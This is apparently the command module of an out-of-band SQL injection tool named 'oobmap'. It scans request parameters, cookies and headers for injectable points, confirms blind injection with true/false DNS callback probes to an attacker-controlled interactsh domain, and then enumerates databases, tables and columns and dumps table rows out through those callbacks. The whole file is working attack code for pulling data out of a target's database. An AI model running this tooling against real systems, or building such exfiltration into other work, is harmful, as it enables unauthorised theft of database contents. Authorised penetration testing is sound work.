import copy
import uuid
from pathlib import Path

from ..dbms import DBMS
from ..oob import InteractshLog, MultiInteractshLog
from ..payloads import PROFILES
from ..session import SessionStore
from ..tamper import TAMPERS, tamper_warnings
from ..transport import injection_points, parse_raw_request
from ..utils.logging import _hi, _log, _sep
from .detection import normalize_domain
from .dispatch import load_common, send_payloads
from .extraction import extract_value
from .formatting import format_csv, format_json, format_table, print_dump_row, split_dump_row


def build_expression(args) -> str:
    if getattr(args, "expr", None):
        return args.expr

    column = getattr(args, "column", None)
    table = getattr(args, "table", None)
    where = getattr(args, "where", None)
    if not (column and table):
        raise SystemExit("dump requires -T/--table and -C/--column")

    if args.dbms in ("mssql", "mssql-cmdshell"):
        expr = f"SELECT TOP 1 {column} FROM {table}"
    else:
        expr = f"SELECT {column} FROM {table}"

    if where:
        expr += f" WHERE {where}"
    if args.dbms not in ("mssql", "mssql-cmdshell"):
        expr += " LIMIT 1"
    return expr


def run_check(args, profile, request, domain, log, run_id) -> int:
    _sep()
    print(f"  profile   {profile.name}  |  run {run_id}")
    print(f"  [~] {profile.comment}")
    print(f"  target    {args.place}:{args.param}")
    print(f"  watching  {', '.join(args.log)}")
    _sep()

    risk = getattr(args, "risk", 2)
    true_token = f"{run_id}-true"
    false_token = f"{run_id}-false"
    _log("INFO", "Sending true probe...")
    send_payloads(args, request, profile.payloads(args.base, args.true_condition, f"{true_token}.{domain}", risk=risk))
    true_hit = log.wait_any({true_token: "true"}, args.timeout)

    _log("INFO", "Sending false probe...")
    send_payloads(args, request, profile.payloads(args.base, args.false_condition, f"{false_token}.{domain}", risk=risk))
    false_hit = log.wait_any({false_token: "false"}, args.timeout)

    if true_hit and not false_hit:
        _log("INFO", _hi("OOB condition confirmed ✓"))
        return 0
    if true_hit and false_hit:
        _log("WARNING", "Both probes triggered — OOB capable but not conditional")
        _log("INFO", "Try adjusting --true-condition/--false-condition, or a "
                      "different --place/-p injection point — the current pair "
                      "isn't producing a differential signal.")
        return 2
    _log("WARNING", "No reliable conditional OOB behavior detected")
    _log("INFO", "Try a different --place/-p injection point, a different "
                  "--dbms profile, a longer --timeout, or confirm outbound "
                  "DNS/HTTP egress from the target.")
    return 1


_STATUS_TO_RC = {"confirmed": 0, "conditional-failed": 2, "not-confirmed": 1}


def check(args) -> int:
    if args.param:
        profile, request, domain, log, run_id, session = load_common(args)
        try:
            check_id = session.check_id(args.dbms, args.place, args.param)
            cached = None if args.fresh_queries else session.get_check(check_id)
            if cached:
                _log("INFO", f"Using cached check result: {cached['status']}")
                _log("INFO", f"Session: {session.path}")
                return _STATUS_TO_RC[cached["status"]]
            rc = run_check(args, profile, request, domain, log, run_id)
            status = "confirmed" if rc == 0 else "conditional-failed" if rc == 2 else "not-confirmed"
            session.save_check(check_id, args.dbms, args.place, args.param, status)
            _log("INFO", f"Session: {session.path}")
            return rc
        finally:
            session.close()

    tamper_names = [t.strip() for t in getattr(args, "tamper", "").split(",") if t.strip()]
    unknown = [t for t in tamper_names if t not in TAMPERS]
    if unknown:
        raise SystemExit(f"unknown tamper(s): {', '.join(unknown)}. Run 'oobmap tampers' for the list.")
    for warning in tamper_warnings(tamper_names, args.dbms):
        _log("WARNING", warning)
    profile = PROFILES[args.dbms]
    request = parse_raw_request(args.request)
    domain = normalize_domain(args.domain)
    log = MultiInteractshLog(args.log) if len(args.log) > 1 else InteractshLog(args.log[0])
    session = SessionStore(args.output_dir, request, args.force_ssl, flush=args.flush_session)
    points = injection_points(request, args.level)
    if not points:
        _log("WARNING", "No injection points found at this level")
        _log("INFO", "Try a higher --level (2 adds cookies, 3 adds common "
                      "headers, 5 scans most remaining headers).")
        session.close()
        return 1

    _log("INFO", f"Scanning {len(points)} injection point(s) (level={args.level})")
    found = False
    for point in points:
        candidate_args = copy.copy(args)
        candidate_args.param = point.name
        candidate_args.place = point.place
        candidate_args.base = point.value
        check_id = session.check_id(args.dbms, point.place, point.name)
        cached = None if args.fresh_queries else session.get_check(check_id)
        if cached:
            _log("INFO", f"Using cached check result for --place {point.place} -p {point.name}: {cached['status']}")
            rc = _STATUS_TO_RC[cached["status"]]
        else:
            run_id = f"{args.run_id or uuid.uuid4().hex[:6]}-{point.place[:1]}{abs(hash((point.place, point.name))) % 10000}"
            print()
            rc = run_check(candidate_args, profile, request, domain, log, run_id)
            status = "confirmed" if rc == 0 else "conditional-failed" if rc == 2 else "not-confirmed"
            session.save_check(check_id, args.dbms, point.place, point.name, status)
        if rc == 0:
            _log("INFO", _hi(f"Injectable OOB point: --place {point.place} -p {point.name}"))
            found = True
            if args.first:
                break

    _log("INFO", f"Session: {session.path}")
    session.close()
    return 0 if found else 1


def extract(args) -> int:
    if not args.param:
        raise SystemExit("--expr requires -p/--param")
    expression = build_expression(args)
    extract_value(args, expression, args.alphabet, args.max_len)
    return 0


def dump(args) -> int:
    if not args.param:
        raise SystemExit("--dump requires -p/--param")
    flush_session_once(args)
    dbms = DBMS[args.dbms]
    columns = [column.strip() for column in args.column.split(",") if column.strip()] if args.column else []
    columns = validate_dump_target(args, dbms, columns)

    _log("INFO", f"Dumping {args.table} — columns: {', '.join(columns)}")
    if args.database:
        _log("INFO", f"Database/schema: {args.database}")
    if args.where:
        _log("INFO", f"Where: {args.where}")

    profile = PROFILES[args.dbms]
    domain = normalize_domain(args.domain)
    _sep()
    print(f"  profile   {profile.name}")
    print(f"  [~] {profile.comment}")
    print(f"  table     {args.table} ({', '.join(columns)})")
    print(f"  domain    {domain}")
    print(f"  watching  {', '.join(args.log)}")
    _sep()
    print()

    rows = []
    for index in range(args.limit):
        expr = dbms.dump_expression(args.table, columns, index, args.where, args.database)
        _log("INFO", f"Extracting row {index + 1}...")
        value = extract_value(args, expr, args.alphabet, args.max_len, show_card=False)
        if not value:
            _log("INFO", "No more rows")
            break
        row = split_dump_row(value, len(columns))
        rows.append(row)
        print_dump_row(columns, row)

    if rows:
        formatter = {"table": format_table, "json": format_json, "csv": format_csv}
        output = formatter[args.output_format](columns, rows)

        if args.output_file:
            Path(args.output_file).write_text(output, encoding="utf-8")
            _log("INFO", f"Saved to {args.output_file}", err=True)
        else:
            if args.output_format == "table":
                print()
                _log("INFO", "Dump result")
            print(output)
    return 0


def enum(args) -> int:
    if not args.param:
        raise SystemExit("enum requires -p/--param")
    flush_session_once(args)
    dbms = DBMS[args.dbms]
    selected = []
    if args.dbs:
        selected.append("dbs")
    for option, key in (
        (args.banner, "banner"),
        (args.current_user, "current_user"),
        (args.current_db, "current_db"),
    ):
        if option:
            selected.append(key)
    if args.tables:
        selected.append("tables")
    if args.columns:
        selected.append("columns")
    if not selected:
        raise SystemExit("enum requires at least one of --dbs, --banner, --current-user, --current-db, --tables, --columns")

    for key in selected:
        if key == "dbs":
            values = enumerate_rows(args, "database", lambda index: dbms.dbs_expression(index))
            save_catalog_values(args, "dbs", values)
            if values:
                _log("INFO", f"Databases: {', '.join(values)}")
            continue
        if key == "tables":
            values = enumerate_rows(args, "table", lambda index: dbms.table_expression(index, args.database))
            save_catalog_values(args, "tables", values)
            continue
        if key == "columns":
            if not args.table:
                raise SystemExit("enum --columns requires -T/--table")
            values = enumerate_rows(
                args,
                f"column({args.table})",
                lambda index: dbms.column_expression(args.table, index, args.database),
            )
            save_catalog_values(args, "columns", values, args.table)
            continue

        expr = dbms.metadata_expression(key)
        if expr is None:
            _log("WARNING", f"{key} is not implemented for {args.dbms}")
        else:
            print()
            _log("INFO", f"Enumerating {key}...")
            value = extract_value(args, expr, args.alphabet, args.max_len)
            _log("INFO", f"{key}: {_hi(value)}")
    return 0


def enumerate_rows(args, label: str, expression_builder) -> list[str]:
    values = []
    print()
    _log("INFO", f"Enumerating {label}s...")
    limit = getattr(args, "_catalog_limit", args.limit)
    for index in range(limit):
        try:
            expr = expression_builder(index)
        except ValueError as exc:
            _log("WARNING", str(exc))
            return values

        value = extract_value(args, expr, args.alphabet, args.max_len, show_card=False)
        if not value:
            _log("INFO", f"No more {label}s")
            break
        values.append(value)
        _log("INFO", f"{label}[{index}]: {_hi(value)}")
    return values


def _table_exists(args, profile, request, domain, log, run_id, table: str) -> bool:
    """Fire one OOB probe to check if a table exists — no full enumeration."""
    condition = f"(SELECT COUNT(*) FROM {table})>=0"
    token = f"{run_id}-tblchk-{table}"
    send_payloads(args, request, profile.payloads(args.base or "", condition, f"{token}.{domain}", risk=getattr(args, "risk", 2)))
    return log.wait_any({token: table}, args.timeout) is not None


def validate_dump_target(args, dbms, columns: list[str]) -> list[str]:
    if not args.validate:
        if not columns:
            raise SystemExit("dump without -C/--column requires validation/enumeration; keep --validate enabled or provide -C")
        return columns

    profile, request, domain, log, run_id, session = load_common(args)
    session.close()
    if not _table_exists(args, profile, request, domain, log, run_id, args.table):
        raise SystemExit(f"[ERROR] table not found: {args.table}")

    known_columns = get_or_enumerate_catalog(
        args,
        "columns",
        lambda index: dbms.column_expression(args.table, index, args.database),
        args.table,
    )
    if not columns:
        if not known_columns:
            raise SystemExit(f"no columns discovered for table: {args.table}")
        _log("INFO", f"Auto-selected columns: {', '.join(known_columns)}")
        return known_columns

    known_upper = {column.upper() for column in known_columns}
    missing = [column for column in columns if column.upper() not in known_upper]
    if missing:
        raise SystemExit(
            "column(s) not confirmed in current session/catalog: "
            + ", ".join(missing)
            + ". Try --fresh-queries or run enum --columns -T "
            + args.table
        )
    return columns


def get_or_enumerate_catalog(args, kind: str, expression_builder, table: str | None = None) -> list[str]:
    request = parse_raw_request(args.request)
    session = SessionStore(args.output_dir, request, args.force_ssl, flush=False)
    try:
        cached = None if args.fresh_queries else session.get_catalog(args.dbms, args.database, kind, table)
    finally:
        session.close()
    if cached is not None:
        _log("INFO", f"Using cached {kind}: {', '.join(cached) if cached else '(empty)'}")
        return cached

    label = "table" if kind == "tables" else f"column({table})"
    catalog_args = copy.copy(args)
    catalog_args._catalog_limit = getattr(args, "enum_limit", args.limit)
    values = enumerate_rows(catalog_args, label, expression_builder)
    save_catalog_values(args, kind, values, table)
    return values


def save_catalog_values(args, kind: str, values: list[str], table: str | None = None):
    request = parse_raw_request(args.request)
    session = SessionStore(args.output_dir, request, args.force_ssl, flush=False)
    try:
        session.save_catalog(args.dbms, args.database, kind, values, table)
    finally:
        session.close()


def flush_session_once(args):
    if not args.flush_session:
        return
    request = parse_raw_request(args.request)
    session = SessionStore(args.output_dir, request, args.force_ssl, flush=True)
    session.close()
    args.flush_session = False
